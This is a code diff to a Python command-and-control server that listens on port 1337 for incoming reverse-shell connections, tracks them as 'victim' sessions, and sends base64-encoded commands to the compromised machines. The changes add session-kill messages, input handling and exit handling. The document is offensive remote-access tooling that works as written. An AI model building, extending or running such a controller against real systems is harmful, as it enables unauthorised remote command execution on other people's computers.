@@ -1,5 +1,6 @@
 from shlex import split
 import socket
+import signal
 import threading
 from _thread import *
 from textwrap import wrap
@@ -12,6 +13,7 @@ from rich import box
 from rich.live import Live
 import queue
 from base64 import b64encode, b64decode
+from subprocess import call
 
 console = Console()
 server = socket.socket()
@@ -39,7 +41,6 @@ class ConnHandler:
                 self.connections.append(victim)
                 self.address.append(address)
                 console.print(f"[bold magenta][-] Got connection -> {address}[/bold magenta]", end="")
-
         except socket.error:
             console.print_exception()
 
@@ -88,9 +89,14 @@ class ConnHandler:
     def Execute(self, sessionID):
         try:
             while True:
-                cmd = console.input(f"[green]({self.address[sessionID][0]})> [/green]").strip()
+                cmd = console.input(f"[bold blue]({self.address[sessionID][0]})> [/bold blue]").strip()
                 if "quit" in cmd:
                     break
+                elif "reset" in cmd:
+                    call('clear')
+                    continue
+                elif cmd == '':
+                    continue
                 enc_cmd = self.encrypt(cmd)
                 self.connections[sessionID].send(enc_cmd)
                 data = self.connections[sessionID].recv(1024)
@@ -103,9 +109,9 @@ class ConnHandler:
         if sessionID == '*':
             for i, connection in enumerate(self.connections):
                 console.print(f"[+] Killing {self.address[i]}", style="red")
-                del self.connections[i]
-                del self.address[i]
+                self.connections[i].send("die".encode())
                 connection.close()
+            self.connections.clear()
         else:
             sessionID = int(sessionID)
             self.connections[sessionID].close()
@@ -120,15 +126,20 @@ class ConnHandler:
                 if "list" in cmd:
                     self.list_Connections()
                 elif "use" in cmd:
-                    sessionID = cmd[1]
-                    self.Execute(int(sessionID))
+                    try:
+                        sessionID = cmd[1]
+                        self.Execute(int(sessionID))
+                    except IndexError:
+                        console.print("[!] Please enter a valid session_id", style="red")
+                        continue
                 elif "kill" in cmd:
                     sessionID = cmd[1]
                     self.kill_Sessions(sessionID)
                 else:
                     continue
-        except KeyboardInterrupt:
-            console.print_exception()
+        except Exception:
+            console.print("\n[!]Press Ctrl+C to exit", style="red")
+            self.shlexy()
 
     def create_workers(self):
         for _ in range(2):
@@ -157,14 +168,19 @@ class ConnHandler:
         except KeyboardInterrupt:
             console.print_exception()
 
+    @staticmethod
+    def signal_handler(sig, frame):
+        exit()
+
 
 if __name__ == '__main__':
     try:
         run = ConnHandler("0.0.0.0", 1337)
         run.create_workers()
         run.create_jobs()
-    except KeyboardInterrupt:  # Doesn't exit ?
-        console.print("\n[-] Ctrl+d to quit", style="red")
+    except KeyboardInterrupt:
+        signal.signal(signal.SIGINT, ConnHandler.signal_handler)
+        console.print("\n[!] Press Ctrl+C again to exit, or press enter to cancel", style="red", end="")
+        signal.pause()
     except EOFError:
-        console.print("\n[*] Exited", style="bold red")
-        exit(1)
+        exit()
